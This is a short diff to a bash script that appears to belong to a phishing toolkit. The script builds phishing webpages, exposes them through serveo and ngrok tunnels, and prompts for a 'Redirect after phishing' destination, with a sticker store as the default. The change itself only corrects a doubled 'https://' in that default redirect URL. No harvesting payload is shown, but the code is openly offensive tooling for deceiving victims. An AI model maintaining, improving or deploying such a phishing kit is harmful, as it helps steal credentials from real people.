@@ -269,7 +269,7 @@ payload() {
 
 link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
 
-url=$redirect # "https://https://getstickerpack.com"
+url=$redirect # "https://getstickerpack.com"
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 payload_name="index"
 printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Building webpages...\e[0m\n"
@@ -314,7 +314,7 @@ checkfound
 redirect() {
 
 
-default_redirect="https://https://getstickerpack.com"
+default_redirect="https://getstickerpack.com"
 
 printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Redirect after phishing (Default:\e[0m\e[1;77m Sticker Store \e[0m\e[1;33m): \e[0m'
 read redirect
